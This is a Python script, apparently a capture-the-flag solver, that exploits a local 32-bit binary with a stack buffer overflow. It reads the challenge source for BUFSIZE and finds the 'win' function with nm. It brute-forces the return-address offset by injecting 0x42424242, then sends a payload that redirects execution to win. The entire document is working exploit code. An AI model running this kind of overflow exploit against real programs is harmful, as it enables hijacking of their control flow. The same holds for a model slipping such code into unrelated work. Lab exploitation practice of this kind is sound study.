import subprocess, re, sys, os, glob, struct, time

os.chdir(os.path.expanduser("~"))
cs = sorted(glob.glob("*.c"), key=os.path.getmtime)
if not cs:
    subprocess.run(["./start"], capture_output=True, timeout=30)
    cs = sorted(glob.glob("*.c"), key=os.path.getmtime)
srcfile = cs[-1]
binname = srcfile[:-2]
code = open(srcfile).read()
m = re.search(r"#define\s+BUFSIZE\s+(\d+)", code)
bufsize = int(m.group(1)) if m else 78
print("bin:", binname, "BUFSIZE:", bufsize)
nm = subprocess.run(["nm", binname], capture_output=True, text=True).stdout
win = None
for line in nm.splitlines():
    parts = line.split()
    if len(parts) == 3 and parts[2] == "win":
        win = int(parts[0], 16)
print("win:", hex(win) if win else None)


def run(payload):
    p = subprocess.Popen(["./" + binname], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        out, _ = p.communicate(payload + b"\n", timeout=5)
    except Exception:
        out = b""
    return out.decode("utf-8", "replace")


# scanner : mettre 0x42424242 a l'offset k
found = None
for k in range(bufsize - 4, bufsize + 40):
    payload = b"A" * k + b"\x42\x42\x42\x42" + b"C" * 4
    txt = run(payload)
    mm = re.search(r"Jumping to 0x([0-9a-f]+)", txt)
    val = mm.group(1) if mm else "?"
    if val != "?" and int(val, 16) == 0x42424242:
        found = k
        print("OFFSET TROUVE:", k)
        break
print("scan termine, offset:", found)
if found is not None and win:
    payload = b"A" * found + struct.pack("<I", win)
    txt = run(payload)
    print("=== RESULTAT ===")
    print(txt[:400])
